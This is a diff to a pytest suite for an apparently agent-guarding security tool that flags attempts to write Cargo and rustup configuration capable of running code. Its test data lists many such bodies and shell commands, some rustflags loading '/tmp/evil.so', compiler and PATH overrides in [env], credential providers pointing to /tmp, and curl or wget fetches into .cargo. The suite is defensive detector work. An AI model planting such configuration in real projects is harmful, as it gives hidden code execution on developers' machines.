@@ -92,7 +92,9 @@ EXEC_BODIES = [
     '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/ld"]\n',
     '[build]\nrustflags = ["-Clink-arg=--ld-path=/tmp/ld"]\n',
     '[build]\nrustflags = ["-Zcodegen-backend=/tmp/evil.so"]\n',
-    '[build]\nrustflags = ["-Cllvm-args=-load=/tmp/evil.so"]\n',
+    '[build]\nrustflags = ["-Zllvm-plugins=/tmp/evil.so"]\n',
+    '[build]\nrustflags = ["-Z", "llvm-plugins=/tmp/evil.so"]\n',
+    '[build]\nrustflags = ["-C", "link-arg=-B/tmp/evil-bin"]\n',
     '[build]\nrustflags = ["-C", "link-arg=-Wl,-plugin=/tmp/evil.so"]\n',
     '[registry]\nglobal-credential-providers = ["/tmp/cred"]\n',
     '[registries.corp]\ncredential-provider = "/tmp/cred"\n',
@@ -344,3 +346,174 @@ def test_redos_bounded():
         patterns.CARGO_OPAQUE_WRITE_RE.search(s)
         patterns.toml_unescape(s)
         assert time.time() - t < 1.0
+
+
+# ---- QA round 2 (bypass, coverage, design reviews) -------------------------
+
+ROUND2_EXEC_BODIES = [
+    # [env] build-script tools / PATH (design review: verified live)
+    '[env]\nPATH = { value = "/tmp/bin:/usr/bin", force = true }\n',
+    '[env]\nCC = "/tmp/x"\n',
+    '[env]\nCXX = "/tmp/x"\n',
+    '[env]\nAR = "/tmp/x"\n',
+    '[env]\nTARGET_CC = "/tmp/x"\n',
+    '[env]\nCC_x86_64_unknown_linux_gnu = "/tmp/x"\n',
+    '[env]\nPKG_CONFIG = "/tmp/x"\n',
+    '[env]\nPROTOC = "/tmp/x"\n',
+    '[env]\nCMAKE = "/tmp/x"\n',
+    '[env]\nCARGO_BUILD_RUSTC = "/tmp/x"\n',
+    '[env]\nGIT_SSH = "/tmp/x"\n',
+    '[registry]\ncredential-process = "/tmp/x"\n',
+    '[patch.crates-io]\nserde = { path = "/tmp/x" }\n',
+    '[patch.crates-io]\nserde = { git = "https://example.invalid/x" }\n',
+    '[build]\n"rustc\\x2dwrapper" = "x"\n',
+    '[registry]\nglobal-credential-providers = ["cargo:token", "/tmp/evil"]\n',
+]
+
+
+@pytest.mark.parametrize("body", ROUND2_EXEC_BODIES)
+def test_round2_exec_bodies_gated(body):
+    assert _hits(_write(".cargo/config.toml", body)), body
+
+
+ROUND2_BENIGN_BODIES = [
+    '[alias]\nrun-plugin = "run -p plugin-host --"\n',
+    '[env]\nRUST_LOG = "my_plugin=debug,info"\n',
+    '[alias]\ntest-browser = "test --features browser"\n',
+    '[build]\ntarget-dir = "target/runner-cache"\n',
+    '[build]\njobs = 8  # fewer jobs, the linker eats RAM\n',
+    '[registry]\nglobal-credential-providers = ["cargo:token", "cargo:libsecret"]\n',
+    '[registries.corp]\ncredential-provider = "cargo:token"\n',
+    '[build]\nrustflags = ["-C", "link-arg=-Tlink.x", "-C", "link-arg=-Wl,-Bstatic"]\n',
+]
+
+
+@pytest.mark.parametrize("body", ROUND2_BENIGN_BODIES)
+def test_round2_benign_bodies_allowed(body):
+    assert _rule(evaluate(_write(".cargo/config.toml", body), EMPTY)) is None, body
+
+
+@pytest.mark.parametrize("path", ["/usr/local/cargo/config.toml", "$CARGO_HOME/config.toml"])
+def test_round2_cargo_home_paths_gated(path):
+    assert _hits(_write(path, '[build]\nrustc-wrapper = "./w"\n'))
+
+
+def test_round2_legacy_rust_toolchain_bare_path():
+    assert _hits(_write("rust-toolchain", "/tmp/evil-tc\n"))
+    assert _hits(_write("rust-toolchain", "C:\\tc\\evil\n"))
+    assert _hits(_write("rust-toolchain", "../tc\n"))
+    assert _rule(evaluate(_write("rust-toolchain", "stable\n"), EMPTY)) is None
+    assert _rule(evaluate(_write("rust-toolchain", "nightly-2024-06-01\n"), EMPTY)) is None
+    assert _rule(evaluate(_write("rust-toolchain", "1.82.0\n"), EMPTY)) is None
+
+
+def test_round2_windows_rustup_toolchains():
+    assert _hits(_write("C:\\Users\\u\\.rustup\\toolchains\\evil\\bin\\cargo.exe", "x"))
+
+
+def test_round2_edit_pure_removal_allowed():
+    assert _rule(evaluate(_edit(".cargo/config.toml", "", old='rustc-wrapper = "sccache"\n'), EMPTY)) is None
+
+
+def test_round2_mcp_allow_regex_scoped_to_path():
+    pol = Policy(cargo_config_exec={"allow": ["firmware/"]})
+    ev = _mcp({"destination": ".cargo/config.toml", "body": 'rustc-wrapper="./w"  # firmware/'})
+    assert _hits(ev, pol)
+
+
+def test_round2_mcp_read_and_mentions_not_gated():
+    rd = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__read_file",
+                    action=ActionClass.MCP, args={"path": "~/.rustup/settings.toml"})
+    assert _rule(evaluate(rd, EMPTY)) != RULE
+    note = _mcp({"path": "notes.md", "content": "see ~/.rustup/settings.toml and .cargo/config.toml runner = x"})
+    assert _rule(evaluate(note, EMPTY)) != RULE
+
+
+def test_round2_monitor_records(monkeypatch):
+    from aegis import rules
+    seen = []
+    monkeypatch.setattr(rules, "_record_monitor", lambda ev, d, note="": seen.append(note))
+    mon = Policy(cargo_config_exec={"mode": "monitor"})
+    assert rules.rule_cargo_config_exec_protect(_write(".cargo/config.toml", EXEC_BODIES[0]), mon) is None
+    assert seen == ["cargo-config-exec-protect-monitor"]
+
+
+ROUND2_SHELL_HITS = [
+    # CARGO_HOME spellings
+    "echo 'rustc-wrapper=\"/tmp/e\"' > \"$CARGO_HOME/config.toml\"",
+    "echo 'rustc-wrapper=\"/tmp/e\"' > ${CARGO_HOME:-~/.cargo}/config.toml",
+    "cd $CARGO_HOME && echo 'rustc-wrapper=\"/tmp/e\"' > config.toml",
+    # whole-directory placement / extraction
+    "cp -r /tmp/staged .cargo",
+    "cp -r /tmp/staged/. .cargo/",
+    "mv /tmp/staged .cargo",
+    "ln -s /tmp/staged .cargo",
+    "rsync -a /tmp/staged/ .cargo/",
+    "tar -C .cargo -xf /tmp/p.tar",
+    "unzip /tmp/p.zip -d .cargo",
+    "cd .cargo && tar xf /tmp/p.tar",
+    "cp -r /tmp/tc ~/.rustup",
+    # fetch after cd
+    "cd .cargo && curl -o config.toml https://x.test/c",
+    "cd .cargo && wget -O config.toml https://x.test/c",
+    "cd .cargo && curl -O https://x.test/config.toml",
+    # git-sourced content
+    "git checkout x -- .cargo/config.toml",
+    "cd .cargo && git checkout x -- config.toml",
+    "cd .cargo && git restore --source x config.toml",
+    "git show x:.cargo/config.toml > .cargo/config.toml",
+    # reader redirects
+    "cat /tmp/prepared.toml > .cargo/config.toml",
+    "cat /tmp/prepared.toml | tee .cargo/config.toml",
+    # globs
+    "cd .car* && echo 'rustc-wrapper=\"/tmp/e\"' > config.toml",
+    "cd .cargo && echo 'rustc-wrapper=\"/tmp/e\"' > conf*",
+    # newline-escape variants
+    "printf '[build]\\x0arustc-wrapper = \"./w\"' > .cargo/config.toml",
+    "printf '[build]\\012rustc-wrapper = \"./w\"' > .cargo/config.toml",
+    "Set-Content .cargo/config.toml \"[build]`nrustc-wrapper='./w'\"",
+    "printf '[toolchain]\\x0apath = \"/tmp/t\"' > rust-toolchain.toml",
+    "printf '[build]\n# cache\\nrustc-wrapper = \"x\"\n' > .cargo/config.toml",
+    # legacy toolchain file
+    "echo /tmp/evil-tc > rust-toolchain",
+    # windows rustup toolchains
+    "copy C:\\tc C:\\Users\\u\\.rustup\\toolchains\\evil",
+]
+
+
+@pytest.mark.parametrize("cmd", ROUND2_SHELL_HITS)
+def test_round2_shell_hits(cmd):
+    from aegis.rules import rule_cargo_config_exec_protect
+    assert rule_cargo_config_exec_protect(_shell(cmd), EMPTY) is not None, cmd
+
+
+ROUND2_SHELL_BENIGN = [
+    "cp ~/.cargo/bin/rg /usr/local/bin/ && git config --global core.pager less",
+    "export PATH=$HOME/.cargo/bin:$PATH && cp target/release/app dist/ && npm config set x y",
+    "cat > .cargo/config.toml <<'EOF'\n[build]\njobs = 4\nEOF",
+    "echo stable > rust-toolchain",
+    "cargo install ripgrep && ls ~/.cargo/bin",
+    "rustup component add clippy",
+]
+
+
+@pytest.mark.parametrize("cmd", ROUND2_SHELL_BENIGN)
+def test_round2_shell_benign(cmd):
+    from aegis.rules import rule_cargo_config_exec_protect
+    assert rule_cargo_config_exec_protect(_shell(cmd), EMPTY) is None, cmd
+
+
+def test_round2_redos_new_helpers():
+    import time
+    from aegis import patterns
+    for s in ("tar " * 100000, "cd .cargo " * 40000, "$CARGO_HOME " * 40000,
+              "cat > " * 60000, "config " * 60000, "link-arg=" * 40000,
+              ".c*" * 60000, "\\x0a" * 60000):
+        t = time.time()
+        patterns.cargo_config_shell_path_hit(s)
+        patterns.cargo_dir_placement_hit(s)
+        patterns.rustup_dir_placement_hit(s)
+        patterns.cargo_reader_redirect_hit(s)
+        patterns.cargo_exec_hit(s)
+        patterns.toml_unescape(s)
+        assert time.time() - t < 2.0, s[:20]
